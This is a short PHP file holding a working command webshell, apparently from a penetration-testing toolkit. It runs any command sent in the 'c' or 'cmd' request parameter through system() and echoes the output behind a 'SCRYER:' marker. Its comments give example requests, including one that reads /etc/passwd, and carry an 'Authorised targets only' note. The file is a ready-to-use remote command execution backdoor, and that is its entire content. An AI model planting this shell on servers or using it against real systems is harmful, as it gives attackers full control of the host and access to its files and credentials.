<?php
/**
 * cmd.php — minimal command webshell.  Authorised targets only.
 *
 *   http://target/cmd.php?c=id
 *   http://target/cmd.php?c=cat+/etc/passwd
 *
 * Accepts the command in ?c= or ?cmd= (GET or POST). The SCRYER: marker makes
 * the output easy to grep out of a larger page (scryer keys on it).
 */
$c = $_REQUEST['c'] ?? $_REQUEST['cmd'] ?? null;
if ($c !== null) { echo "SCRYER:"; system($c . ' 2>&1'); }
